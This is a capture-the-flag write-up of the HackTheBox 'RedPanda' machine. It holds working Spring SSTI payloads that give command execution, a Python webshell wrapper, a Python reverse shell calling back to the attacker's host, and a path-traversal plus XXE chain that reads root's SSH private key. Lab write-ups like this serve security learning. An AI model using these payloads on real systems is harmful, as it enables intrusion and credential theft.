---
description: RedPanda box from HackTheBox write up.
password: 72fa710b2639f298febbb0917f402182
---

# RedPanda

## Nmap

Here it comes the Nmap scan!

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1500 -p- -Pn 10.10.11.170
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 04:29 EST
Nmap scan report for 10.10.11.170
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 22,8080 10.10.11.170
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 04:30 EST
Nmap scan report for 10.10.11.170
Host is up (0.046s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
``` 

Only 2 ports open, since one of them is SSH I will start with the 8080 that looks like a web service.

## Red Panda Search

### The user flag

The application looks like a search engine for panda photos. It basically counts the visits to the photos of a certain artist when they appear in your search (The browser cache looks like mess with this a bit).

After looking around I was able to find what looks like a SSTI vulnerability in the search bar. Introducing something like: `*{T(java.lang.System).getenv()}` prints the environment variables of the system:

```java
{PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}
```

After some trial and error I got RCE using this query `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`:

```bash
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

I created a little Python script to allow me to use this RCE like a really simple prompt, not perfect but effective to get the user flag!

```python
import requests
from bs4 import BeautifulSoup


url = 'http://10.10.11.170:8080/search'

while True:
	command = input('> ')
	data = {'name': "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('" + command + "').getInputStream())}"}

	response = requests.post(url, data = data)
	if response.ok:
		soup = BeautifulSoup(response.content, "html.parser")
		command_out = soup.find_all("h2", class_="searched")
		print(command_out[0].get_text().replace('You searched for: ', ''))
```

### Reverse shell

The webshell was ok for simple enumeration but I needed something better. I tried my best trying to get a reverse shell but something was not working properly. I decided to upload this simple Python reverse shell script to the target and execute it through the webshell:

```python
import sys,socket,os,pty


s=socket.socket()
s.connect(("10.10.14.26", 8000))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

It worked like a charm so we have a proper shell now.

## Privesc

### Enumerating the system

I noticed that I got access as the `woodenk` user through my reverse shell:

```bash
woodenk@redpanda:/tmp$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

Fun fact, I decided to get a shell with SSH for stability but the problem here was that the SSH session had less privileges than my reverse shell:

```bash
woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
```

In the SSH session we are not part of the `logs` group so let's avoid it. I tried to look for files owned by the `logs` group:

```bash
woodenk@redpanda:/$ find / -group logs 2> /dev/null | grep -v woodenk | grep -v proc | grep -v tmp
/opt/panda_search/redpanda.log
/credits
```

The `redpanda.log` file is just a log with the requests that arrives to the web application we saw earlier, I noticed that it is cleared every now and then for some reason.

Inside the `/credits` directory there are some XML files that looks like are responsible for storing the information about the different authors visit counter. Then, the `/opt` directory contains the files for two different services: `panda_search` and `credit-score`.

In the `panda_search` source code I was able to find the password for the MySQL database (It is empty by the way). The password is also valid for the `woodenk` user in the box but as I said before, SSH session is not an option for now.


```java
// /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
...
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
...
```

About the `credit-score` service, according to `pspy` it is executed by the `root` user every minute or so:

```bash
2022/11/25 12:26:01 CMD: UID=0    PID=4592   | /usr/sbin/CRON -f 
2022/11/25 12:26:01 CMD: UID=0    PID=4595   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2022/11/25 12:26:01 CMD: UID=0    PID=4594   | /bin/sh /root/run_credits.sh 
2022/11/25 12:26:01 CMD: UID=0    PID=4593   | /bin/sh -c /root/run_credits.sh
```

Checking the code of the application, it is looking for log lines in the file `/opt/panda_search/redpanda.log` with the substring ".jpg" in them. If the program finds a match, the service will determine that someone watched a photo and add a new visit to its artist.

This is the application code:

```java
// /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

I will try to summarize what the code is doing:

- The program start reading one by one the lines in the log file `/opt/panda_search/redpanda.log`.
- If the line contains the substring `.jpg` the program will process it if not it just continues reading.
- Once the substring is found in a line, the program parse the line to extract the status code, the ip address of the client, the user agend of the client and the URL visited.
- From the URL the program build a path to the image the client checked to get the artist name from the image metadata.
- Once the artist name is obtained, the code build another path, this time to the XML file holding the information for the artist.
- The code add 1 to the visit count of the artist photo that the client visited and also adds 1 to the total visits of the artist.

### Exploit time

The problem with this code is that it is building paths to files without sanitizing the user input so we can abuse it and perform a path traversal attack. This is the idea:

- Introducing this line into the log file will make the code look for a image outside the expected directory, since we have control over `/tmp` we can use whatever image we want:
```
200||localhost||AGENT||/../../../../../../../tmp/mal.jpg
```

- The image will have a metadata tag called `Artist` with a path traversal payload. The idea is to force it to search for a XML for this Artist in the `/tmp`:
```bash
┌──(kali㉿kali)-[~/Documents/HTB/RedPanda/privesc]
└─$ exiftool -Artist="../../../../../../../../../../tmp/mal" mal.jpg
    1 image files updated
```
- For the final part of the exploit, the XML file, that we will force the code to process, will contain an external entity (XXE) to read the SSH key of the `root` user:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY exploit SYSTEM "/root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../tmp/mal.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
  <data>&exploit;</data>
</credits>
```

After putting the malicious XML file and the custom image in the `/tmp` directory, we can add the line  I mentioned above in the log file and wait for the magic to happen. Eventually, if we check the XML file the `data` tag will now contain the private SSH key of the `root` user.

Since the SSH configuration allows the `root` user to connect through SSH, we can now use it to connect through SSH and get the flag!
